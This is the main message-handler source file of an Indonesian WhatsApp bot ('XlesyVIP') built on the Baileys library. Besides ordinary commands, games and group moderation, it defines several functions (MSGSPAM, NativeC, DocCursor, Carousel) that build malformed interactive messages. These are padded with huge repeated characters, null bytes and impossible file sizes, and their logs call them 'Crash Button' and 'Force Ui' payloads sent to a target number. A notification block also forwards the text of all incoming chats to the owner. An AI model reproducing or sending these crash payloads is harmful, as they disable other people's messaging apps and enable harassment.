/*SCRIPT: XlesyVIP 
CREATOR: Gxyenn
SaveCONTACT Creator 
6283877636168
*/

process.on('uncaughtException', console.error)
process.on('unhandledRejection', console.error)
require('./settings');
const fs = require('fs');
const os = require('os');
const qs = require('qs');
const util = require('util');
const gis = require('g-i-s');
const jimp = require('jimp');
const path = require('path');
const https = require('https');
const axios = require('axios');
const chalk = require('chalk');
const yts = require('yt-search');
const ytdl = require('ytdl-core');
const cron = require('node-cron');
const cheerio = require('cheerio');
const fetch = require('node-fetch');
const FileType = require('file-type');
const { JSDOM } = require('jsdom');
const google = require('googlethis');
const similarity = require('similarity');
const PDFDocument = require('pdfkit');
const webp = require('node-webpmux');
const ffmpeg = require('fluent-ffmpeg');
const speed = require('performance-now');
const didYouMean = require('didyoumean');
const { performance } = require('perf_hooks');
const moment = require('moment-timezone');
const translate = require('translate-google-api');
const { Akinator, AkinatorAnswer } = require('aki-api');
const { exec, spawn, execSync } = require('child_process');
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, getBinaryNodeChildren, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@whiskeysockets/baileys');

const prem = require('./src/premium');
const { antiSpam } = require('./src/antispam');
const { cerpen } = require('./lib/cerpen');
const JsConfuser = require('js-confuser');
const crypto = require('crypto');
const { LoadDataBase } = require('./src/message');
const { TelegraPh, UguuSe } = require('./lib/uploader');
const { toAudio, toPTT, toVideo } = require('./lib/converter');
const { JadiBot, StopJadiBot, ListJadiBot } = require('./src/jadibot');
const { imageToWebp, videoToWebp, writeExif } = require('./lib/exif');
const { rdGame, iGame, tGame, gameSlot, gameCasinoSolo, gameMerampok, gameBegal, daily, buy, setLimit, addLimit, addUang, setUang, transfer } = require('./lib/game');
const { pinterest, wallpaper, remini, wikimedia, yanzGpt, mediafireDl, ringtone, styletext, instagramDl, tiktokDl, facebookDl, instaStory, bk9Ai, spotifyDl, ytMp4, ytMp3, quotedLyo, youSearch, simi } = require('./lib/screaper');
const { unixTimestampSeconds, generateMessageTag, processTime, webApi, getRandom, getBuffer, fetchJson, runtime, clockString, sleep, isUrl, getTime, formatDate, tanggal, formatp, jsonformat, reSize, toHD, logic, generateProfilePicture, bytesToSize, checkBandwidth, getSizeMedia, parseMention, getGroupAdmins, readFileTxt, readFileJson, getHashedPassword, generateAuthToken, cekMenfes, generateToken, batasiTeks, randomText, isEmoji, getTypeUrlMedia, pickRandom, convertTimestampToDate, getAllHTML } = require('./lib/function');

// Read Database
const sewa = JSON.parse(fs.readFileSync('./database/sewa.json'));
const premium = JSON.parse(fs.readFileSync('./database/premium.json'));

// Database Game
let suit = db.game.suit = []
let menfes = db.game.menfes = []
let tekateki = db.game.tekateki = []
let akinator = db.game.akinator = []
let tictactoe = db.game.tictactoe = []
let tebaklirik = db.game.tebaklirik = []
let kuismath = db.game.kuismath = []
let tebaklagu = db.game.tebaklagu = []
let tebakkata = db.game.tebakkata = []
let family100 = db.game.family100 = []
let susunkata = db.game.susunkata = []
let tebakbom = db.game.tebakbom = []
let tebakkimia = db.game.tebakkimia = []
let caklontong = db.game.caklontong = []
let tebakangka = db.game.tebakangka = []
let tebaknegara = db.game.tebaknegara = []
let tebakgambar = db.game.tebakgambar = []
let tebakbendera = db.game.tebakbendera = []

module.exports = Xlesy = async (Xlesy, m, chatUpdate, store, groupCache) => {
	try {
		
		await LoadDataBase(Xlesy, m);
		
		const botNumber = await Xlesy.decodeJid(Xlesy.user.id)
		const body = (m.type === 'conversation') ? m.message.conversation : (m.type == 'imageMessage') ? m.message.imageMessage.caption : (m.type == 'videoMessage') ? m.message.videoMessage.caption : (m.type == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.type == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.type == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.type == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.type === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : (m.type === 'editedMessage') ? (m.message.editedMessage.message.protocolMessage.editedMessage.extendedTextMessage ? m.message.editedMessage.message.protocolMessage.editedMessage.extendedTextMessage.text : m.message.editedMessage.message.protocolMessage.editedMessage.conversation) : ''
		const budy = (typeof m.text == 'string' ? m.text : '')
		const isCreator = isOwner = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
		const prefix = isCreator ? (/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@()#,'"*+÷/\%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@()#,'"*+÷/\%^&.©^]/gi)[0] : /[\uD800-\uDBFF][\uDC00-\uDFFF]/gi.test(body) ? body.match(/[\uD800-\uDBFF][\uDC00-\uDFFF]/gi)[0] : listprefix.find(a => body.startsWith(a)) || '') : db.set[botNumber].multiprefix ? (/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@()#,'"*+÷/\%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@()#,'"*+÷/\%^&.©^]/gi)[0] : /[\uD800-\uDBFF][\uDC00-\uDFFF]/gi.test(body) ? body.match(/[\uD800-\uDBFF][\uDC00-\uDFFF]/gi)[0] : listprefix.find(a => body.startsWith(a)) || '¿') : listprefix.find(a => body.startsWith(a)) || '¿'
		const isCmd = body.startsWith(prefix)
		const args = body.trim().split(/ +/).slice(1)
		const quoted = m.quoted ? m.quoted : m
		const command = isCreator ? body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase() : isCmd ? body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase() : ''
		const text = q = args.join(' ')
		const mime = (quoted.msg || quoted).mimetype || ''
		const qmsg = (quoted.msg || quoted)
		const hari = moment.tz('Asia/Jakarta').locale('id').format('dddd');
		const tanggal = moment.tz('Asia/Jakarta').locale('id').format('DD/MM/YYYY');
		const jam = moment.tz('Asia/Jakarta').locale('id').format('HH:mm:ss');
		const ucapanWaktu = jam < '05:00:00' ? 'Selamat Pagi 🌉' : jam < '11:00:00' ? 'Selamat Pagi 🌄' : jam < '15:00:00' ? 'Selamat Siang 🏙' : jam < '18:00:00' ? 'Selamat Sore 🌅' : jam < '19:00:00' ? 'Selamat Sore 🌃' : jam < '23:59:00' ? 'Selamat Malam 🌌' : 'Selamat Malam 🌌';
		const almost = 0.72
		const time = Date.now()
		const time_now = new Date()
		const time_end = 60000 - (time_now.getSeconds() * 1000 + time_now.getMilliseconds());
		const readmore = String.fromCharCode(8206).repeat(999)
		const setv = pickRandom(listv)
		
		const isVip = db.users[m.sender] ? db.users[m.sender].vip : false
		const isLimit = db.users[m.sender] ? (db.users[m.sender].limit > 0) : false
		const isPremium = isCreator || prem.checkPremiumUser(m.sender, premium) || false
		const isNsfw = m.isGroup ? db.groups[m.chat].nsfw : false

			// Fake
	    const textf = m.body;  // Mengambil pesan yang dikirim pengirim

const fkontak1 = {
  key: { remoteJid: "status@broadcast", participant: '0@s.whatsapp.net', },
  message: {
    "extendedTextMessage": {
      "text": `${textf}`  // Menggunakan pesan yang dikirim oleh pengirim
    }
  }
}
			
const ftroli = {
  key: { fromMe: false, participant: "0@s.whatsapp.net", remoteJid: "status@broadcast" },
  message: {
    orderMessage: {
      message: '© XlesyVIP',
      itemCount: 1904750173,
      status: 200,
      surface: 200,
      orderTitle: 'Gxyenn',
      sellerJid: '0@s.whatsapp.net'
    }
  },
  contextInfo: { forwardingScore: 999, isForwarded: true },
  sendEphemeral: true
}

		// Reset Limit
		cron.schedule('00 00 * * *', () => {
			console.log('Reseted Limit Users')
			let user = Object.keys(db.users)
			for (let jid of user) {
				const limitUser = db.users[jid].vip ? limit.vip : prem.checkPremiumUser(jid, premium) ? limit.premium : limit.free
				if (db.users[jid].limit < limitUser) db.users[jid].limit = limitUser
			}
		}, {
			scheduled: true,
			timezone: 'Asia/Jakarta'
		})
		
		// Auto Set Bio
		if (db.set[botNumber].autobio) {
			let setbio = db.set[botNumber]
			if (new Date() * 1 - setbio.status > 60000) {
				await Xlesy.updateProfileStatus(`${Xlesy.user.name} | 🎯 Runtime : ${runtime(process.uptime())}`, { quoted: fkontak1 })
				setbio.status = new Date() * 1
			}
		}
		
		// Set Public
		if (!Xlesy.public) {
			if (!isCreator && !m.key.fromMe) return
		}
async function MSGSPAM(Pe) {
    let Msg = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
            contextInfo: {
              mentionedJid: ["13135550002@s.whastapp.net"],
              isForwarded: true,
              forwardingScore: 999,
              businessMessageForwardInfo: {
                businessOwnerJid: Pe,
              },
            },
            body: {
              text: "༿༑ᜳXlesyy̸𝗖͠͠͠𝗛̭𝗜̬ᢶ⃟",
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
              ],
            },
          },
        },
      },
    };

    await Xlesy.relayMessage(Pe, Msg, {
      participant: { jid: Pe },
    })
  }
  async function NativeC(Pe) {
  let NativeCore = {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2,
        },
        interactiveMessage: {
          contextInfo: {
            mentionedJid: ["13135550002@s.whatsapp.net"],
            isForwarded: true,
            forwardingScore: 999,
            businessMessageForwardInfo: {
              businessOwnerJid: Pe,
            },
            dataSharingContext: {
              showMmDisclosure: true,
            },
          },
          body: {
            title: "👑",
            text: "𝗥̸̷̷̷̋͜͢͜͢͠͡͡ 𝗬̸̷̷̷̋͜͢͜͢͠͡͡ 𝗖̸̷̷̷̋͜͢͜͢͠͡͡-" + "᭄".repeat(9741),
            description: "💌",
            footer: "T-Яyuichi",
          },
          nativeFlowMessage: {
            buttons: [
              { name: "single_select", buttonParamsJson: "" },
              { name: "view_product", buttonParamsJson: "" },
              { name: "payment_method", buttonParamsJson: "" },
              { name: "call_permission_request", buttonParamsJson: "" },
              { name: "mpm", buttonParamsJson: "" },
              { name: "payment_info", buttonParamsJson: "" },
            ],
          },
        },
      },
    },
  };
  await Xlesy.relayMessage(Pe, NativeCore, {
    participant: { jid: Pe },
  });
  console.log("Success! Crash Button Sent")
}		
async function DocCursor(Pe) {
const stanza = [
{
attrs: { biz_bot: '1' },
tag: "bot",
},
{
attrs: {},
tag: "biz",
},
];

let messagePayload = {
viewOnceMessage: {
message: {
listResponseMessage: {
title: " Cursor-Crash⃟" + "ꦾ".repeat(4500),
listType: 2,
singleSelectReply: {
    selectedRowId: "🔪"
},
contextInfo: {
stanzaId: Xlesy.generateMessageTag(),
participant: "0@s.whatsapp.net",
remoteJid: "status@broadcast",
mentionedJid: [Pe, "13135550002@s.whatsapp.net"],
quotedMessage: {
                buttonsMessage: {
                    documentMessage: {
                        url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                        mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                        fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                        fileLength: "9999999999999",
                        pageCount: 3567587327,
                        mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                        fileName: "༿༑ᜳ𝗥͢𝗬𝗨͜𝗜̸𝗖͠͠͠𝗛̭𝗜̬ᢶ⃟",
                        fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                        directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
                        mediaKeyTimestamp: "1735456100",
                        contactVcard: true,
                        caption: "Wanna Die ? Huh !"
                    },
                    contentText: "I Wanna Die With You \"😮‍💨\"",
                    footerText: "© T-Яyuichi",
                    buttons: [
                        {
                            buttonId: "\u0000".repeat(850000),
                            buttonText: {
                                displayText: "⩟⬦𪲁 Xlesy̸̷̷̷͡𝐗͜͢𝐒 -"
                            },
                            type: 1
                        }
                    ],
                    headerType: 3
                }
},
conversionSource: "porn",
conversionData: crypto.randomBytes(16),
conversionDelaySeconds: 9999,
forwardingScore: 999999,
isForwarded: true,
quotedAd: {
advertiserName: " x ",
mediaType: "IMAGE",
jpegThumbnail: null,
caption: " x "
},
placeholderKey: {
remoteJid: "0@s.whatsapp.net",
fromMe: false,
id: "ABCDEF1234567890"
},
expiration: -99999,
ephemeralSettingTimestamp: Date.now(),
ephemeralSharedSecret: crypto.randomBytes(16),
entryPointConversionSource: "wangcap",
entryPointConversionApp: "wangcap",
actionLink: {
url: "t.me/tamainfinity",
buttonTitle: "trash"
},
disappearingMode:{
initiator:1,
trigger:2,
initiatorDeviceJid: Pe,
initiatedByMe:true
},
groupSubject: "crash",
parentGroupJid: "combine",
trustBannerType: "unexpected",
trustBannerAction: 99999,
isSampled: true,
externalAdReply: {
title: "𑲭𑲭 T-Riyu ~ \"ryc\" ⚔️ ",
mediaType: 2,
renderLargerThumbnail: false,
showAdAttribution: false,
containsAutoReply: false,
body: "© T-Яyuichi",
thumbnail: null,
sourceUrl: "se me?",
sourceId: "ryc ~ broken",
ctwaClid: "cta",
ref: "ref",
clickToWhatsappCall: true,
automatedGreetingMessageShown: false,
greetingMessageBody: "burst",
ctaPayload: "cta",
disableNudge: true,
originalImageUrl: "trash"
},
featureEligibilities: {
cannotBeReactedTo: true,
cannotBeRanked: true,
canRequestFeedback: true
},
forwardedNewsletterMessageInfo: {
newsletterJid: "120363334736301537@newsletter",
serverMessageId: 1,
newsletterName: `Crash Sletter ~ ${"ꥈꥈꥈꥈꥈꥈ".repeat(10)}`,
contentType: 3,
accessibilityText: "crash"
},
statusAttributionType: 2,
utm: {
utmSource: "utm",
utmCampaign: "utm2"
}
},
description: "INITIATED_BY_USER"
},
messageContextInfo: {
messageSecret: crypto.randomBytes(32),
supportPayload: JSON.stringify({
version: 2,
is_ai_message: true,
should_show_system_message: true,
ticket_id: crypto.randomBytes(16),
}),
},
}
}
}

await Xlesy.relayMessage(Pe, messagePayload, {
additionalNodes: stanza,
participant: { jid : Pe }
});
console.log("Success! Force Ui Sent")
}		
async function Carousel(Pe) {
    const msg = generateWAMessageFromContent(
        Pe,
        {
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        body: {
                            text: `\0`
                        },
                        carouselMessage: {
                            cards: [
                                {
                                    header: {
                                        ...(await prepareWAMessageMedia(
                                            { image: { url: "https://files.catbox.moe/n1nqsc.jpg" } }, 
                                            { upload: Xlesy.waUploadToServer }
                                        )),
                                        title: `\0`,
                                        gifPlayback: true,
                                        subtitle: '\0',
                                        hasMediaAttachment: true
                                    },
                                    body: {
                                        text: `𝐂𝐚𝐫𝐨𝐮𝐬𝐞𝐥 𝐂𝐫𝐚𝐬𝐡` + "ꦾ".repeat(120000)
                                    },
                                    footer: {
                                        text: "\0"
                                    },
                                    nativeFlowMessage: {
                                        buttons: [
                                            {
                                                name: "single_select",
                                                buttonParamsJson: JSON.stringify({
                                                    title: "😂۞Xlesyܢ𝐎𝐯𝐞𝐫𝐅𝐥𝐨⃕𝐰⃟😂 ",
                                                    sections: []
                                                })
                                            },
                                            {
                                                name: "single_select",
                                                buttonParamsJson: `{"title":"${"𑲭𑲭".repeat(60000)}","sections":[{"title":" i wanna be kill you ","rows":[]}]}`
                                            },
                                            {
                                                name: "call_permission_request",
                                                buttonParamsJson: "{}"
                                            },
                                            {
                                                name: "mpm",
                                                buttonParamsJson: "{}"
                                            },
                                            {
                                                name: "single_select",
                                                buttonParamsJson: "{\"title\":\"🦠\",\"sections\":[{\"title\":\"🔥\",\"highlight_label\":\"💥\",\"rows\":[{\"header\":\"\",\"title\":\"💧\",\"id\":\"⚡\"},{\"header\":\"\",\"title\":\"💣\",\"id\":\"✨\"}]}]}"
                                            },
                                            {
                                                name: "quick_reply",
                                                buttonParamsJson: "{\"display_text\":\"Quick Crash Reply\",\"id\":\"📌\"}"
                                            },
                                            {
                                                name: "cta_url",
                                                buttonParamsJson: "{\"display_text\":\"Developed\",\"url\":\"https://www.youtube.com/@Gxyenn\",\"merchant_url\":\"https://www.youtube.com/@Gxyenn\"}"
                                            },
                                            {
                                                name: "cta_call",
                                                buttonParamsJson: "{\"display_text\":\"Call Us Null\",\"id\":\"message\"}"
                                            },
                                            {
                                                name: "cta_copy",
                                                buttonParamsJson: "{\"display_text\":\"Copy Crash Code\",\"id\":\"message\",\"copy_code\":\"#CRASHCODE9741\"}"
                                            },
                                            {
                                                name: "cta_reminder",
                                                buttonParamsJson: "{\"display_text\":\"Set Reminder Crash\",\"id\":\"message\"}"
                                            },
                                            {
                                                name: "cta_cancel_reminder",
                                                buttonParamsJson: "{\"display_text\":\"Cancel Reminder Crash\",\"id\":\"message\"}"
                                            },
                                            {
                                                name: "address_message",
                                                buttonParamsJson: "{\"display_text\":\"Send Crash Address\",\"id\":\"message\"}"
                                            },
                                            {
                                                name: "send_location",
                                                buttonParamsJson: "\0"
                                            }
                                        ]
                                    }
                                }
                            ],
                            messageVersion: 1,
                        }
                    }
                }
            }
        },
        { quoted: m }
    );
    await Xlesy.relayMessage(Pe, msg.message, {
        messageId: msg.key.id,
    });
    console.log("Success! Crl Button Sent")
}		
				//animecari
		
		const axios = require("axios");

const searchAnime = async (Xlesy, m, query) => {
    try {
        if (!query) return m.reply("⚠️ Masukkan judul anime atau genre yang ingin dicari!")

        let url = `https://api.jikan.moe/v4/anime?q=${encodeURIComponent(query)}&limit=5`;
        let response = await axios.get(url)
        let results = response.data.data

        if (!results || results.length === 0) {
            return m.reply("❌ Anime tidak ditemukan!");
        }

        let animeList = results.slice(0, 3).map((anime, index) => {
            return `*${index + 1}. ${anime.title}*\n🎭 *Genre:* ${anime.genres.map(g => g.name).join(", ")}\n📅 *Tayang:* ${anime.aired.string}\n⭐ *Skor:* ${anime.score}\n🔗 *Link:* [MyAnimeList](${anime.url})\n`;
        }).join("\n\n")

        let imageUrl = results[0].images.jpg.large_image_url;
        
        await Xlesy.sendMessage(m.chat, {
            image: { url: imageUrl },
            caption: `🔍 *Hasil Pencarian Anime:*\n\n${animeList}`
        }, { quoted: fkontak1 })

    } catch (err) {
        console.error("Error fetching anime:", err)
        m.reply("⚠️ Server Sedang Offline .")
    }
}

		// Auto Read
		if (m.message && m.key.remoteJid !== 'status@broadcast') {
			console.log(chalk.black(chalk.bgWhite('[ PESAN ]:'), chalk.bgGreen(new Date), chalk.bgHex('#00EAD3')(budy || m.type) + '\n' + chalk.bgCyanBright('[ DARI ] :'), chalk.bgYellow(m.pushName || (isCreator ? 'Bot' : 'Anonim')), chalk.bgHex('#FF449F')(m.sender), chalk.bgHex('#FF5700')(m.isGroup ? m.metadata.subject : m.chat.endsWith('@newsletter') ? 'Newsletter' : 'Private Chat'), chalk.bgBlue('(' + m.chat + ')')));
			if (db.set[botNumber].autoread && Xlesy.public) await Xlesy.readMessages([m.key])
		}
		
		//notif
const fs = require('fs');
const configPath = './lib/notif.json';

// Fungsi untuk membaca konfigurasi
function loadConfig() {
    if (!fs.existsSync(configPath)) {
        return { notifChat: true }; // Default ON jika file tidak ada
    }
    return JSON.parse(fs.readFileSync(configPath));
}

// Fungsi untuk menyimpan konfigurasi
function saveConfig(newConfig) {
    fs.writeFileSync(configPath, JSON.stringify(newConfig, null, 2));
}

let notif = loadConfig(); // Load notif saat bot dimulai

switch (command) {
    case 'notifon':
        notif.notifChat = true;
        saveConfig(notif);
        Xlesy.sendMessage(m.chat, { text: '✅ Notifikasi chat masuk telah sukses *diaktifkan*.' }, { quoted: fkontak1 });
        break;

    case 'notifoff':
        notif.notifChat = false;
        saveConfig(notif);
        Xlesy.sendMessage(m.chat, { text: '✅ Notifikasi chat masuk telah sukses *dinonaktifkan*.' }, { quoted: fkontak1 });
        break;
}

if (!m.key.fromMe && notif.notifChat) {
    let ownerNumber = '6283877636168@s.whatsapp.net'; // Ganti dengan nomor WhatsApp owner
    let sender = `@${m.sender.split('@')[0]}`;
    let chatName = '⚡ _\`Chat Pribadi\`_ ';  // Default jika pesan bukan dari grup

    // Cek apakah pesan berasal dari grup
    if (m.isGroup) {
        try {
            let groupMetadata = await Xlesy.groupMetadata(m.chat);
            chatName = `📢 *\`Grup:\`* ${groupMetadata.subject}`;
        } catch (error) {
            chatName = '📢 *\`Grup:\`* Tidak Dapat Diambil';
        }
    }

    let messageContent = m.text || '[Media]';

    // **Cek apakah pesan berasal dari status atau saluran**
    if (m.chat.endsWith('@broadcast') || m.chat.endsWith('@channel')) {
        return; // **Abaikan pesan dari status atau saluran**
    }

    let notifMsg = `🐬 _*Notifikasi Chat Masuk*_\n\n👤 _*\`From:\`*_${sender}\n${chatName}\n💬 _\`Messages\`_ *:* ${messageContent}\n\nGunakan *replay/replay1 ${m.sender.split('@')[0]} [pesan]* untuk membalas.`;

    Xlesy.sendMessage(ownerNumber, { text: notifMsg, mentions: [m.sender] }, { quoted: ftroli });
}
		// Group Settings
		if (m.isGroup) {
			// Mute
			if (db.groups[m.chat].mute && !isCreator) {
				return
			}
			
			// Anti Delete
			if (m.type == 'protocolMessage' && db.groups[m.chat].antidelete && !isCreator && m.isBotAdmin && !m.isAdmin) {
				const mess = chatUpdate.messages[0].message.protocolMessage
				if (store.messages && store.messages[m.chat] && store.messages[m.chat].array) {
					const chats = store.messages[m.chat].array.find(a => a.id === mess.key.id);
					chats.msg.contextInfo = { mentionedJid: [chats.key.participant], isForwarded: true, forwardingScore: 1, quotedMessage: { conversation: '*Anti Delete❗*'}, ...chats.key }
					const pesan = chats.type === 'conversation' ? { extendedTextMessage: { text: chats.msg, contextInfo: { mentionedJid: [chats.key.participant], isForwarded: true, forwardingScore: 1, quotedMessage: { conversation: '*Anti Delete❗*'}, ...chats.key }}} : { [chats.type]: chats.msg }
					await Xlesy.relayMessage(m.chat, pesan, {})
				}
			}
			
			// Anti Link Group
			if (db.groups[m.chat].antilink && !isCreator && m.isBotAdmin && !m.isAdmin) {
				if (budy.match('chat.whatsapp.com/')) {
					const isGcLink = new RegExp(`https://chat.whatsapp.com/${await Xlesy.groupInviteCode(m.chat)}`, 'i').test(m.text);
					if (isGcLink) return
					await Xlesy.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.id, participant: m.sender }})
					await Xlesy.relayMessage(m.chat, { extendedTextMessage: { text: `Terdeteksi @${m.sender.split('@')[0]} Mengirim Link Group\nMaaf Link Harus Di Hapus..`, contextInfo: { mentionedJid: [m.key.participant], isForwarded: true, forwardingScore: 1, quotedMessage: { conversation: '*Anti Link❗*'}, ...m.key }}}, {})
				}
			}
			
			// Anti Virtex Group
			if (db.groups[m.chat].antivirtex && !isCreator && m.isBotAdmin && !m.isAdmin) {
				if (budy.length > 6000) {
					await Xlesy.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.id, participant: m.sender }})
					await Xlesy.relayMessage(m.chat, { extendedTextMessage: { text: `Terdeteksi @${m.sender.split('@')[0]} Mengirim Virtex..`, contextInfo: { mentionedJid: [m.key.participant], isForwarded: true, forwardingScore: 1, quotedMessage: { conversation: '*Anti Virtex❗*'}, ...m.key }}}, {})
					await Xlesy.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
				}
				if (m.msg.nativeFlowMessage && m.msg.nativeFlowMessage.messageParamsJson && m.msg.nativeFlowMessage.messageParamsJson.length > 3500) {
					await Xlesy.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.id, participant: m.sender }})
					await Xlesy.relayMessage(m.chat, { extendedTextMessage: { text: `Terdeteksi @${m.sender.split('@')[0]} Mengirim Bug..`, contextInfo: { mentionedJid: [m.key.participant], isForwarded: true, forwardingScore: 1, quotedMessage: { conversation: '*Anti Bug❗*'}, ...m.key }}}, {})
					await Xlesy.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
				}
			}
			
		}
		
		// Filter Bot
		if (m.isBot) return
		
		// Mengetik & Anti Spam
		if (Xlesy.public && isCmd) {
			if (db.set[botNumber].autotyping) {
				await Xlesy.sendPresenceUpdate('composing', m.chat)
			}
			if (db.set[botNumber].antispam && antiSpam.isFiltered(m.sender)) {
				console.log(chalk.bgRed('[ SPAM ] : '), chalk.black(chalk.bgHex('#1CFFF7')(`From -> ${m.sender}`, { quoted: fkontak1 }), chalk.bgHex('#E015FF')(` In ${m.isGroup ? m.chat : 'Private Chat'}`)))
				return m.reply('\`TOLONG BERI JEDA 5 - 10 SESCODNS KAK KARENA BOT AKAN DELAY JIKALAU DI SPAM\`🦖', { quoted: fkontak1 })
			}
		}
		
		if (isCmd && !isCreator) antiSpam.addFilter(m.sender)
		
		// Salam
		if (/^a(s|ss)alamu('|)alaikum(| )(wr|)( |)(wb|)$/.test(budy?.toLowerCase())) {
			const jwb_salam = ['Wa\'alaikumusalam','Wa\'alaikumusalam wr wb','Wa\'alaikumusalam Warohmatulahi Wabarokatuh']
			m.reply(pickRandom(jwb_salam), { quoted: fkontak1 })
		}
		
		// Waktu Sholat
		const jadwalSholat = {
			Subuh: '04:30',
			Dzuhur: '12:06',
			Ashar: '15:21',
			Maghrib: '18:08',
			Isya: '19:28'
		}
		if (!this.intervalSholat) this.intervalSholat = null;
		if (!this.waktusholat) this.waktusholat = {};
		if (this.intervalSholat) clearInterval(this.intervalSholat); 
		setTimeout(() => {
			this.intervalSholat = setInterval(async() => {
				const jamSholat = moment.tz('Asia/Jakarta').locale('id').format('HH:mm');
				for (const [sholat, waktu] of Object.entries(jadwalSholat)) {
					if (jamSholat === waktu && this.waktusholat[sholat] !== jamSholat) {
						this.waktusholat[sholat] = jamSholat
						for (const [idnya, settings] of Object.entries(db.groups)) {
							if (settings.waktusholat) {
								await Xlesy.sendMessage(idnya, { text: `Waktu *${sholat}* telah tiba, ambilah air wudhu dan segeralah shalat🙂.\n\n*${waktu.slice(0, 5)}*\n_untuk wilayah Jakarta dan sekitarnya._` }, { ephemeralExpiration: m.expiration || 0 }).catch(e => {})
							}
						}
					}
				}
			}, 60000)
		}, time_end);
		
		// Cek Expired
		prem.expiredCheck(Xlesy, premium);
		
		// TicTacToe
		let room = Object.values(tictactoe).find(room => room.id && room.game && room.state && room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender) && room.state == 'PLAYING')
		if (room) {
			let ok
			let isWin = !1
			let isTie = !1
			let isSurrender = !1
			if (!/^([1-9]|(me)?nyerah|surr?ender|off|skip)$/i.test(m.text)) return
			isSurrender = !/^[1-9]$/.test(m.text)
			if (m.sender !== room.game.currentTurn) {
				if (!isSurrender) return !0
			}
			if (!isSurrender && 1 > (ok = room.game.turn(m.sender === room.game.playerO, parseInt(m.text) - 1))) {
				m.reply({
					'-3': 'Game telah berakhir',
					'-2': 'Invalid',
					'-1': 'Posisi Invalid',
					0: 'Posisi Invalid',
				}[ok])
				return !0
			}
			if (m.sender === room.game.winner) isWin = true
			else if (room.game.board === 511) isTie = true
			let arr = room.game.render().map(v => {
				return {
					X: '❌',
					O: '⭕',
					1: '1️⃣',
					2: '2️⃣',
					3: '3️⃣',
					4: '4️⃣',
					5: '5️⃣',
					6: '6️⃣',
					7: '7️⃣',
					8: '8️⃣',
					9: '9️⃣',
				}[v]
			})
			if (isSurrender) {
				room.game._currentTurn = m.sender === room.game.playerX
				isWin = true
			}
			let winner = isSurrender ? room.game.currentTurn : room.game.winner
			if (isWin) {
				db.users[m.sender].limit += 3
				db.users[m.sender].uang += 3000
			}
			let str = `Room ID: ${room.id}\n\n${arr.slice(0, 3).join('')}\n${arr.slice(3, 6).join('')}\n${arr.slice(6).join('')}\n\n${isWin ? `@${winner.split('@')[0]} Menang!` : isTie ? `Game berakhir` : `Giliran ${['❌', '⭕'][1 * room.game._currentTurn]} (@${room.game.currentTurn.split('@')[0]})`}\n❌: @${room.game.playerX.split('@')[0]}\n⭕: @${room.game.playerO.split('@')[0]}\n\nKetik *nyerah* untuk menyerah dan mengakui kekalahan`
			if ((room.game._currentTurn ^ isSurrender ? room.x : room.o) !== m.chat)
			room[room.game._currentTurn ^ isSurrender ? 'x' : 'o'] = m.chat
			if (room.x !== room.o) await Xlesy.sendMessage(room.x, { text: str, mentions: parseMention(str) }, { quoted: fkontak1 })
			await Xlesy.sendMessage(room.o, { text: str, mentions: parseMention(str) }, { quoted: fkontak1 })
			if (isTie || isWin) {
				delete tictactoe[room.id]
			}
		}
		
		// Suit PvP
		let roof = Object.values(suit).find(roof => roof.id && roof.status && [roof.p, roof.p2].includes(m.sender))
		if (roof) {
			let win = ''
			let tie = false
			if (m.sender == roof.p2 && /^(acc(ept)?|terima|gas|oke?|tolak|gamau|nanti|ga(k.)?bisa|y)/i.test(m.text) && m.isGroup && roof.status == 'wait') {
				if (/^(tolak|gamau|nanti|n|ga(k.)?bisa)/i.test(m.text)) {
					m.reply(`@${roof.p2.split`@`[0]} menolak suit,\nsuit dibatalkan`, { quoted: fkontak1 })
					delete suit[roof.id]
					return !0
